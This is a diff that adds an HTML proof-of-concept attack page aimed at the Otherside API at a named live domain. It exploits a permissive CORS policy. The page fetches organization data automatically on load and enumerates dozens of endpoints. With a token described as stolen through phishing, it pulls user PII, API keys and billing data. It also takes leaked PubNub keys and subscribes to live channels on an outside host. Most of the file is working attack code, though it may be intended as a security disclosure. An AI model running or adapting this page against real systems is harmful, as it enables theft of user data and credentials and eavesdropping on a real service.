@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Attack PoC - Otherside API</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 20px;
+        }
+        h1 { color: #ff7b72; margin-bottom: 5px; font-size: 20px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 13px; }
+        .attack-box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        .attack-box h2 {
+            color: #ffa657;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .indicator { 
+            display: inline-block; width: 8px; height: 8px; 
+            border-radius: 50%; margin-right: 4px; 
+        }
+        .green { background: #3fb950; }
+        .red { background: #f85149; }
+        .yellow { background: #d29922; }
+        pre {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            overflow-x: auto;
+            font-size: 11px;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .btn {
+            background: #238636;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            margin: 4px;
+        }
+        .btn:hover { background: #2ea043; }
+        .btn-danger { background: #da3633; }
+        .btn-danger:hover { background: #f85149; }
+        .status-line { font-size: 12px; margin: 4px 0; }
+        .success { color: #3fb950; }
+        .error { color: #f85149; }
+        .warning { color: #d29922; }
+        .info { color: #58a6ff; }
+        #log { margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>CORS * Attack PoC</h1>
+    <p class="subtitle">This page can be hosted on ANY domain and still read Otherside API data</p>
+
+    <div class="attack-box">
+        <h2><span class="indicator red"></span> Attack 1: Read Org Data (NO AUTH REQUIRED)</h2>
+        <p style="color:#8b949e;font-size:12px;margin-bottom:8px">
+            /api/v0/organizations/current returns sensitive data to anyone, with CORS: *
+        </p>
+        <button class="btn" onclick="attack1_orgData()">Execute Attack</button>
+        <div id="result1"></div>
+    </div>
+
+    <div class="attack-box">
+        <h2><span class="indicator red"></span> Attack 2: Enumerate API Endpoints</h2>
+        <p style="color:#8b949e;font-size:12px;margin-bottom:8px">
+            Discover all 70+ API routes and check which ones leak data
+        </p>
+        <button class="btn" onclick="attack2_enumerate()">Execute Attack</button>
+        <div id="result2"></div>
+    </div>
+
+    <div class="attack-box">
+        <h2><span class="indicator yellow"></span> Attack 3: Authenticated Data Theft (needs token)</h2>
+        <p style="color:#8b949e;font-size:12px;margin-bottom:8px">
+            With a stolen Firebase token (from phishing), read ALL user data cross-origin
+        </p>
+        <input type="text" id="token-input" placeholder="Paste stolen Firebase ID Token here" 
+               style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;margin-bottom:8px;font-size:11px">
+        <button class="btn btn-danger" onclick="attack3_authenticated()">Steal All Data</button>
+        <div id="result3"></div>
+    </div>
+
+    <div class="attack-box">
+        <h2><span class="indicator yellow"></span> Attack 4: PubNub Real-time Eavesdrop</h2>
+        <p style="color:#8b949e;font-size:12px;margin-bottom:8px">
+            Subscribe to live PubNub channels (keys leaked from org endpoint)
+        </p>
+        <button class="btn" onclick="attack4_pubnub()">Start Eavesdropping</button>
+        <div id="result4"></div>
+    </div>
+
+    <div id="log"></div>
+
+    <script>
+        const API_BASE = 'https://odk.otherside.xyz/api/v0';
+        
+        function log(msg, type = 'info') {
+            const el = document.getElementById('log');
+            const line = document.createElement('div');
+            line.className = 'status-line ' + type;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            el.appendChild(line);
+        }
+
+        // =====================================================
+        // Attack 1: Read org data without any authentication
+        // =====================================================
+        async function attack1_orgData() {
+            const el = document.getElementById('result1');
+            el.innerHTML = '<p class="status-line warning">Fetching...</p>';
+            log('Attack 1: Fetching /organizations/current from ' + window.location.origin, 'warning');
+
+            try {
+                const resp = await fetch(`${API_BASE}/organizations/current`);
+                const data = await resp.json();
+                
+                el.innerHTML = `
+                    <p class="status-line success">SUCCESS! CORS * allowed cross-origin read from ${window.location.origin}</p>
+                    <p class="status-line warning">Leaked Data:</p>
+                    <pre>${JSON.stringify(data, null, 2)}</pre>
+                    <p class="status-line error">STOLEN: PubNub keys, Org ID, Tenant ID, Auth providers, Feature flags, Featured event ID</p>
+                `;
+                log('Attack 1: SUCCESS - Org data stolen cross-origin', 'success');
+            } catch(e) {
+                el.innerHTML = `<p class="status-line error">Failed: ${e.message}</p>`;
+                log('Attack 1: FAILED - ' + e.message, 'error');
+            }
+        }
+
+        // =====================================================
+        // Attack 2: Enumerate all API endpoints
+        // =====================================================
+        async function attack2_enumerate() {
+            const el = document.getElementById('result2');
+            el.innerHTML = '<p class="status-line warning">Enumerating endpoints...</p>';
+            log('Attack 2: Enumerating 70+ API endpoints', 'warning');
+
+            const endpoints = [
+                'organizations/current',
+                'accounts/users/current',
+                'organizations/projects',
+                'organizations/apiKeys',
+                'origin/access',
+                'origin/worlds',
+                'origin/worlds/current',
+                'origin/sessions/queue',
+                'origin/monitoring',
+                'origin/roles',
+                'origin/releases',
+                'origin/mods',
+                'billing/enabled',
+                'billing/pricingModels',
+                'billing/usages/hourly',
+                'billing/usages/daily',
+                'billing/usages/monthly',
+                'telemetry-query/analytics/activeUsers',
+                'telemetry-query/analytics/uniqueUsers',
+                'telemetry-query/analytics/ccu',
+                'telemetry-query/analytics/aggregations',
+                'telemetry-query/analytics/journey',
+                'telemetry-query/userAttendance',
+                'worlds',
+                'worlds/current',
+                'worlds/list',
+                'worlds/scalingProfiles',
+                'permissions',
+                'permissions/roles',
+                'permissions/templates',
+                'profile',
+                'wallet',
+                'wallet/nonce',
+                'live-config/schema',
+                'launcher/install',
+                'origin/streaming',
+                'world-builder/assets',
+                'world-builder/mods',
+                'fast-play-builds',
+            ];
+
+            let results = '';
+            let noAuth = [];
+            let needsAuth = [];
+            let notFound = [];
+
+            for (const ep of endpoints) {
+                try {
+                    const resp = await fetch(`${API_BASE}/${ep}`, {
+                        method: 'GET',
+                        headers: { 'Authorization': '' }
+                    });
+                    const status = resp.status;
+                    let tag = '';
+                    if (status === 200) {
+                        tag = '🔴 NO AUTH';
+                        noAuth.push(ep);
+                    } else if (status === 401) {
+                        tag = '🟡 NEEDS AUTH';
+                        needsAuth.push(ep);
+                    } else if (status === 404) {
+                        tag = '⚫ NOT FOUND';
+                        notFound.push(ep);
+                    } else {
+                        tag = `⚪ ${status}`;
+                    }
+                    results += `${tag} /v0/${ep}\n`;
+                } catch(e) {
+                    results += `❌ /v0/${ep} - ${e.message}\n`;
+                }
+            }
+
+            el.innerHTML = `
+                <p class="status-line success">Enumeration complete!</p>
+                <p class="status-line error">🔴 No auth required: ${noAuth.length} endpoints</p>
+                <p class="status-line warning">🟡 Needs token: ${needsAuth.length} endpoints</p>
+                <p class="status-line" style="color:#8b949e">⚫ Not found: ${notFound.length} endpoints</p>
+                <pre>${results}</pre>
+            `;
+            log(`Attack 2: Found ${noAuth.length} unauthenticated, ${needsAuth.length} auth-required endpoints`, 'success');
+        }
+
+        // =====================================================
+        // Attack 3: Authenticated data theft with stolen token
+        // =====================================================
+        async function attack3_authenticated() {
+            const token = document.getElementById('token-input').value.trim();
+            if (!token) {
+                alert('Paste a Firebase ID Token first');
+                return;
+            }
+
+            const el = document.getElementById('result3');
+            el.innerHTML = '<p class="status-line warning">Stealing all data with stolen token...</p>';
+            log('Attack 3: Using stolen token from ' + window.location.origin, 'error');
+
+            const endpoints = [
+                { path: 'accounts/users/current', label: 'User Account (PII)' },
+                { path: 'organizations/projects', label: 'Projects' },
+                { path: 'organizations/apiKeys', label: 'API Keys' },
+                { path: 'origin/access', label: 'Access Permissions' },
+                { path: 'origin/worlds', label: 'Worlds' },
+                { path: 'origin/worlds/current', label: 'Current World' },
+                { path: 'billing/enabled', label: 'Billing Status' },
+                { path: 'billing/pricingModels', label: 'Pricing Model' },
+                { path: 'billing/usages/hourly', label: 'Hourly Usage' },
+                { path: 'billing/usages/daily', label: 'Daily Usage' },
+                { path: 'permissions/roles', label: 'Roles' },
+                { path: 'permissions/templates', label: 'Permission Templates' },
+                { path: 'profile', label: 'User Profile' },
+                { path: 'origin/roles', label: 'Origin Roles' },
+                { path: 'origin/monitoring', label: 'Monitoring Data' },
+                { path: 'origin/streaming', label: 'Streaming Config' },
+                { path: 'worlds/scalingProfiles', label: 'Scaling Profiles' },
+                { path: 'telemetry-query/analytics/activeUsers', label: 'Active Users' },
+                { path: 'telemetry-query/analytics/uniqueUsers', label: 'Unique Users' },
+                { path: 'telemetry-query/analytics/ccu', label: 'CCU Stats' },
+            ];
+
+            let stolenData = '';
+            let stolenCount = 0;
+
+            for (const ep of endpoints) {
+                try {
+                    const resp = await fetch(`${API_BASE}/${ep.path}`, {
+                        headers: { 'Authorization': `Bearer ${token}` }
+                    });
+                    
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        stolenData += `\n=== ${ep.label} (200 OK) ===\n${JSON.stringify(data, null, 2).substring(0, 500)}\n`;
+                        stolenCount++;
+                    } else if (resp.status !== 404) {
+                        stolenData += `\n=== ${ep.label} (${resp.status}) ===\n`;
+                    }
+                } catch(e) {
+                    stolenData += `\n=== ${ep.label} ERROR ===\n${e.message}\n`;
+                }
+            }
+
+            el.innerHTML = `
+                <p class="status-line error">DATA STOLEN from ${stolenCount} endpoints via CORS * from ${window.location.origin}</p>
+                <pre>${stolenData}</pre>
+            `;
+            log(`Attack 3: Stole data from ${stolenCount} endpoints cross-origin`, 'success');
+        }
+
+        // =====================================================
+        // Attack 4: PubNub real-time eavesdropping
+        // =====================================================
+        async function attack4_pubnub() {
+            const el = document.getElementById('result4');
+            log('Attack 4: Subscribing to PubNub channels', 'warning');
+
+            // First get the keys from the org endpoint
+            try {
+                const resp = await fetch(`${API_BASE}/organizations/current`);
+                const org = await resp.json();
+                const subKey = org.features.pubnub.subscribeKey;
+                const pubKey = org.features.pubnub.publishKey;
+
+                el.innerHTML = `
+                    <p class="status-line success">PubNub keys obtained from CORS * endpoint!</p>
+                    <p class="status-line">Subscribe Key: <code>${subKey}</code></p>
+                    <p class="status-line">Publish Key: <code>${pubKey}</code></p>
+                    <p class="status-line warning">Attempting to subscribe via REST API...</p>
+                    <div id="pubnub-result"></div>
+                `;
+
+                // Try subscribing via REST
+                try {
+                    const subResp = await fetch(
+                        `https://ps.pndsn.com/v2/subscribe/${subKey}/otherside/0?heartbeat=30`,
+                        { signal: AbortSignal.timeout(5000) }
+                    );
+                    const subData = await subResp.text();
+                    document.getElementById('pubnub-result').innerHTML = `
+                        <p class="status-line success">Subscription WORKS! Real-time data accessible!</p>
+                        <pre>${subData.substring(0, 1000)}</pre>
+                    `;
+                    log('Attack 4: PubNub subscription successful!', 'success');
+                } catch(e) {
+                    if (e.name === 'TimeoutError') {
+                        document.getElementById('pubnub-result').innerHTML = `
+                            <p class="status-line warning">Long-polling active (connection held open = subscription works)</p>
+                            <p class="status-line">Attacker would use a persistent script to monitor channels</p>
+                        `;
+                        log('Attack 4: PubNub long-polling confirmed (timeout = subscription active)', 'success');
+                    } else {
+                        document.getElementById('pubnub-result').innerHTML = `
+                            <p class="status-line error">CORS blocked on PubNub REST (but keys are still stolen)</p>
+                            <p class="status-line">Attacker would use the keys from a server-side script</p>
+                        `;
+                        log('Attack 4: PubNub REST blocked by CORS, but keys are exfiltrated', 'warning');
+                    }
+                }
+
+            } catch(e) {
+                el.innerHTML = `<p class="status-line error">Failed: ${e.message}</p>`;
+            }
+        }
+
+        // Auto-run Attack 1 on page load
+        log('CORS Attack PoC loaded on: ' + window.location.origin, 'info');
+        log('Target: odk.otherside.xyz (CORS: Access-Control-Allow-Origin: *)', 'warning');
+        setTimeout(attack1_orgData, 1000);
+    </script>
+</body>
+</html>
